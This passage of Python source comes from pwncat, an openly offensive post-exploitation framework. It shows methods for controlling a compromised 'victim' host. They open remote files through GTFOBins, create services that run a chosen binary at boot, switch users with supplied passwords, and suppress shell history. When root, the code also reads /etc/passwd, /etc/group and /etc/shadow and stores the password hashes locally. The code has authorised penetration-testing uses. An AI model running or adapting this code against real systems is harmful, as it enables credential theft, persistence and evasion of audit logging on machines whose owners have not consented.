            pipe = io.TextIOWrapper(io.BufferedWriter(pipe))

        return pipe

    def open(
        self, path: str, mode: str, length=None
    ) -> Union[io.BufferedReader, io.BufferedWriter, io.TextIOWrapper]:
        """
        Mimic the built-in ``open`` function on the remote host. The returned
        file-like object can be used as either a file reader or file writer (but
        not both) for a remote file. The implementation for reading and writing
        files is selected using the GTFOBins module and the ``victim.which``
        method. No other interaction with the remote host is allowed while a file
        or process stream is open. This will cause a dead-lock. This method
        may raise a FileNotFoundError or PermissionDenied in case of access issues
        with the remote file.
        
        :param path: remote file path
        :type path: str
        :param mode: the open mode; this cannot contain both read and write!
        :type mode: str
        :param length: if known, the length of the data you will write. this is used
            to open up extra GTFOBins options. It is not required.
        :type length: int
        :return: Union[io.BufferedReader, io.BufferedWriter, io.TextIOWrapper]
        """

        # We can't do simultaneous read and write
        if "r" in mode and "w" in mode:
            raise ValueError("only one of 'r' or 'w' may be specified")

        if "r" in mode:
            pipe = self.open_read(path, mode)
        else:
            pipe = self.open_write(path, mode, length)

        return pipe

    def tempfile(
        self, mode: str, length: int = None, suffix: str = ""
    ) -> Union[io.BufferedWriter, io.TextIOWrapper]:
        """
        Create a remote temporary file and open it in the specified mode.
        The mode must contain "w", as opening a new file for reading makes
        not sense. If "b" is not included, the file will be opened in text mode.
        
        :param mode: the mode string as with ``victim.open``
        :type mode: str
        :param length: length of the expected data (as with ``open``)
        :type length: int, optional
        :param suffix: suffix of the temporary file name
        :type suffix: str, optional
        :return: Union[io.BufferedWriter, io.TextIOWrapper]
        """

        # Reading a new temporary file doesn't make sense
        if "w" not in mode:
            raise ValueError("expected write mode for temporary files")

        try:
            path = self.env(["mktemp", f"--suffix={suffix}"])
            path = path.strip().decode("utf-8")
        except FileNotFoundError:
            path = "/tmp/tmp" + util.random_string(8) + suffix

        return self.open(path, mode, length=length)

    @property
    def services(self) -> Iterator[RemoteService]:
        """
        Yield a list of installed services on the remote system. The returned service
        objects allow the option to start, stop, or enable the service, if appropriate
        permissions are available. This assumes the init system of the remote host is
        known and an abstract RemoteService layer is implemented for the init system.
        Currently, only ``systemd`` is understood by pwncat, but facilities to implement
        more abstracted init systems is built-in.
        
        :return: Iterator[RemoteService]
        """

        # Ensure we know how to handle this init system
        if self.host.init not in pwncat.remote.service_map:
            return

        # Yield the services which are enumerated from this specific init system
        yield from pwncat.remote.service_map[self.host.init].enumerate()

    def find_service(self, name: str, user: bool = False) -> RemoteService:
        """
        Locate a remote service by name. This uses the same interface as the ``services``
        property, meaning a supported ``init`` system must be used on the remote host.
        If the service is not found, a ValueError is raised.
        
        :param name: the name of the remote service
        :type name: str
        :param user: whether to lookup user services (e.g. ``systemctl --user``)
        :type user: bool
        :return: RemoteService
        """
        # Ensure we know how to handle this init system
        if self.host.init not in pwncat.remote.service_map:
            raise ValueError("unknown service manager")

        # Pass the request to the init-specific system
        return pwncat.remote.service_map[self.host.init].find(name, user)

    def create_service(
        self,
        name: str,
        description: str,
        target: str,
        runas: str,
        enable: bool,
        user: bool = False,
    ) -> RemoteService:
        """
        Create a service on the remote host which will execute the specified binary.
        The remote ``init`` system must be understood, as with the ``services`` property.
        A ValueError is raised if the init system is not understood by ``pwncat``.
        A PermissionError may be raised if insufficient permissions are found to create
        the service.
        
        :param name: the name of the remote service
        :type name: str
        :param description: the description for the remote service
        :type description: str
        :param target: the remote binary to start as a service
        :type target: str
        :param runas: the remote user to run the service as
        :type runas: str
        :param enable: whether to enable the service at boot
        :type enable: bool
        :param user: whether this service should be a user service
        :type user: bool
        :return: RemoteService
        """

        # Ensure we know how to handle this init system
        if self.host.init not in pwncat.remote.service_map:
            raise ValueError("unknown service manager")

        # Pass the request to the init-specific system
        return pwncat.remote.service_map[self.host.init].create(
            name, description, target, runas, enable, user
        )

    def su(self, user: str, password: str = None, check: bool = False):
        """
        Attempt to switch users to the specified user. If you are currently UID=0,
        the password is ignored. Otherwise, the password will first be checked
        and then utilized to switch the active user of your shell. If ``check``
        is specified, do not actually switch users. Only check that the given
        password is correct.
        
        Raises PermissionError if the password is incorrect or the ``su`` fails.
        
        :param user: the user to switch to
        :type user: str
        :param password: the password for the specified user or None if currently UID=0
        :type password: str
        :param check: if true, only check the password; do not escalate
        :type check: bool
        """

        current_user = self.id

        if password is None and current_user["uid"]["id"] != 0:
            raise PermissionError("no password provided and whoami != root!")

        if current_user["uid"]["id"] != 0:
            # Verify the validity of the password
            self.env(["su", user, "-c", "echo good"], wait=False)
            self.recvuntil(b": ")
            self.client.send(password.encode("utf-8") + b"\n")

            result = self.recvuntil(b"\n")
            if (
                password.encode("utf-8") in result
                or result == b"\r\n"
                or result == b"\n"
            ):
                result = self.recvuntil(b"\n")

            if b"failure" in result.lower() or b"good" not in result.lower():
                raise PermissionError(f"{user}: invalid password")

        # We don't need to escalate, only checking the password
        if check:
            return

        # Switch users
        self.env(["su", user], wait=False)

        if current_user["uid"]["id"] != 0:
            self.recvuntil(b": ")
            self.client.sendall(password.encode("utf-8") + b"\n")
            self.flush_output()

    def raw(self, echo: bool = False):
        """
        Place the remote terminal in raw mode. This is used internally to facilitate
        binary file transfers. It should not be called normally, as it removes the
        ability to send control sequences.
        """
        self.stty_saved = self.run("stty -g").decode("utf-8").strip()
        # self.run("stty raw -echo", wait=False)
        self.process("stty raw -echo", delim=False)
        self.has_cr = False
        self.has_echo = False

    def restore_remote(self):
        """
        Restore the remote prompt after calling ``victim.raw``. This restores the saved
        stty state which was saved upon calling ``victim.raw``.
        """
        self.run(f"stty {self.stty_saved}", wait=False)
        self.flush_output()
        self.has_cr = True
        self.has_echo = True
        self.run("echo")
        self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")

    def flush_output(self, some=False):
        """
        Flush any data in the socket buffer.
        
        :param some: if true, wait for at least one byte of data before flushing.
        :type some: bool
        """
        output = b""
        old_timeout = self.client.gettimeout()
        self.client.settimeout(0)
        # self.client.send(b"echo\n")
        # some = True

        while True:
            try:
                new = self.client.recv(4096)
                if len(new) == 0:
                    if len(output) > 0 or some == False:
                        break
                output += new
            except (socket.timeout, BlockingIOError):
                if len(output) > 0 or some == False:
                    break

        self.client.settimeout(old_timeout)

    def peek_output(self, some=False):
        """
        Retrieve the currently pending data in the socket buffer without
        removing the data from the buffer.
        
        :param some: if true, wait for at least one byte of data to be received
        :type some: bool
        :return: bytes
        """
        output = b""
        # old_blocking = self.client.getblocking()
        old_timeout = self.client.gettimeout()
        self.client.settimeout(1)

        while True:
            try:
                output2 = self.client.recv(len(output) + 1, socket.MSG_PEEK)
                if len(output2) <= len(output):
                    break
                output = output2
            except (socket.timeout, BlockingIOError):
                if output == b"" and some:
                    continue
                break

        self.client.settimeout(old_timeout)

        return output

    def reset(self, hard: bool = True):
        """
        Reset the remote terminal using the ``reset`` command. This also restores
        your prompt, and sets up the environment correctly for ``pwncat``.

        :param hard: whether to actually call the `reset` command.
            This prevents a long pause when we simply need to reset other
            things such as the prompt, aliases or history control.
        """
        if hard:
            self.run("reset", wait=False)
        self.has_cr = True
        self.has_echo = True
        self.run("unset HISTFILE; export HISTCONTROL=ignorespace")
        self.run("unset PROMPT_COMMAND")
        self.run("unalias -a")
        self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")
        self.run(f"tput rmam")

    def recvuntil(self, needle: bytes, interp=False):
        """
        Receive data from the socket until the specified string of bytes is
        found. There is no timeout features, so you should be 100% sure these
        bytes will end up in the output of the remote process at some point.
        
        :param needle: the bytes to search for
        :type needle: bytes
        :param flags: flags to pass to the underlying ``recv`` call
        :type flags: int
        :return: bytes
        """

        if isinstance(needle, str):
            needle = needle.encode("utf-8")

        result = b""
        while not result.endswith(needle):
            try:
                data = self.client.recv(1)
                # Bash sends some **WEIRD** shit and wraps it in backspace
                # characters for some reason. When asked, we interpret the
                # backspace characters so the response is what we expect.
                if interp and data == b"\x08":
                    if len(result) > 0:
                        result = result[:-1]
                else:
                    result += data
            except (socket.timeout, BlockingIOError):
                continue  # force waiting

        return result

    def whoami(self):
        """
        Use the ``whoami`` command to retrieve the current user name.
        
        :return: str, the current user name
        """
        return self.cached_user

    def update_user(self):
        """
        Requery the current user
        :return: the current user
        """
        self.cached_user = self.run("whoami").strip().decode("utf-8")
        return self.cached_user

    def getenv(self, name: str):
        """
        Utilize ``echo`` to get the current value of the given environment variable.
        
        :param name: environment variable name
        :type name: str
        :return: str
        """
        return self.run(f"echo -n ${{{name}}}").decode("utf-8")

    @property
    def id(self) -> Dict[str, Any]:
        """
        Retrieves a dictionary representing the result of the ``id`` command.
        The resulting dictionary looks like:
       
        .. code-block:: python
        
            {
                "uid": { "name": "username", "id": 1000 },
                "gid": { "name": "username", "id": 1000 },
                "euid": { "name": "username", "id": 1000 },
                "egid": { "name": "username", "id": 1000 },
                "groups": [ {"name": "wheel", "id": 10} ],
                "context": "SELinux context"
            }
        
        :return: Dict[str,Any]
        """

        id_output = self.run("id").decode("utf-8")

        pieces = id_output.split(" ")
        props = {}
        for p in pieces:
            segments = p.split("=")
            props[segments[0]] = segments[1]

        id_properties = {}
        for key, value in props.items():
            if key == "groups":
                groups = []
                for group in value.split(","):
                    p = group.split("(")
                    groups.append({"id": int(p[0]), "name": p[1].split(")")[0]})
                id_properties["groups"] = groups
            elif key == "context":
                id_properties["context"] = value.split(":")
            else:
                p = value.split("(")
                id_properties[key] = {"id": int(p[0]), "name": p[1].split(")")[0]}

        if "euid" not in id_properties:
            id_properties["euid"] = id_properties["uid"]

        if "egid" not in id_properties:
            id_properties["egid"] = id_properties["gid"]

        if "context" not in id_properties:
            id_properties["context"] = []

        return id_properties

    def reload_users(self):
        """
        Reload user and group information from /etc/passwd and /etc/group and
        update the local database.
        
        """

        ident = self.id
        # Keep a list of users by name so we can remove users that no longer exist
        current_users = []
        # Same as above for

        # Clear the user cache
        with self.open("/etc/passwd", "r") as filp:
            for line in filp:
                line = line.strip()
                if line == "" or line[0] == "#":
                    continue
                line = line.strip().split(":")
                user = (
                    self.session.query(pwncat.db.User)
                    .filter_by(host_id=self.host.id, id=int(line[2]), name=line[0])
                    .first()
                )
                if user is None:
                    user = pwncat.db.User(host_id=self.host.id, id=int(line[2]))
                user.name = line[0]
                user.id = int(line[2])
                user.gid = int(line[3])
                user.fullname = line[4]
                user.homedir = line[5]
                user.shell = line[6]
                if user not in self.host.users:
                    self.host.users.append(user)
                current_users.append(user.name)

        # Remove users that don't exist anymore
        for user in self.host.users:
            if user.name not in current_users:
                self.session.delete(user)
                self.host.users.remove(user)

        with self.open("/etc/group", "r") as filp:
            for line in filp:
                line = line.strip()
                if line == "" or line.startswith("#"):
                    continue

                line = line.split(":")
                group = (
                    self.session.query(pwncat.db.Group)
                    .filter_by(host_id=self.host.id, id=int(line[2]))
                    .first()
                )
                if group is None:
                    group = pwncat.db.Group(
                        name=line[0], id=int(line[2]), host_id=self.host.id
                    )

                group.name = line[0]
                group.id = int(line[2])

                for username in line[3].split(","):
                    user = (
                        self.session.query(pwncat.db.User)
                        .filter_by(host_id=self.host.id, name=username)
                        .first()
                    )
                    if user is not None and user not in group.members:
                        group.members.append(user)

                if group not in self.host.groups:
                    self.host.groups.append(group)

        if ident["euid"]["id"] == 0:
            with self.open("/etc/shadow", "r") as filp:
                for line in filp:
                    entries = line.strip().split(":")

                    if len(entries) < 2:
                        # This doesn't make sense. Malformed /etc/shadow
                        continue

                    user = (
                        self.session.query(pwncat.db.User)
                        .filter_by(host_id=self.host.id, name=entries[0])
                        .first()
                    )
                    if user is None:
                        # There's a shadow entry for a non-existent user...
                        continue

                    if entries[1] != "!!" and entries[1] != "*":
                        user.hash = entries[1]
                    else:
                        user.hash = None

        # Reload the host object
        self.host = (
            self.session.query(pwncat.db.Host).filter_by(id=self.host.id).first()
        )

        return self.users

    @property
    def users(self) -> Dict[str, pwncat.db.User]:
        """
        Return a list of users from the local user database cache.
        If the users have not been requested yet, this willc all ``victim.reload_users``.
        
        :return: Dict[str, pwncat.db.User]
        """

        if self.client is None:
            return {}

        if len(self.host.users) == 0:
            self.reload_users()

        known_users = {}

        for user in self.host.users:
            known_users[user.name] = user

        return known_users

    def find_user_by_id(self, uid: int):
        """
        Locate a user in the database with the specified user ID.
        
        :param uid: the user id to look up
        :type uid: int
        :returns: str
        """

        for user in self.users.values():
            if user.id == uid:
                return user
        raise KeyError

    @property
    def current_user(self) -> Optional[pwncat.db.User]:
        """
        Retrieve the database User object for the current user. This will
        call ``victim.whoami()`` to retrieve the current user and cross-reference
        with the local user database.
        
        :return: pwncat.db.User
        """
        name = self.whoami()
        if name in self.users:
            return self.users[name]
        return None
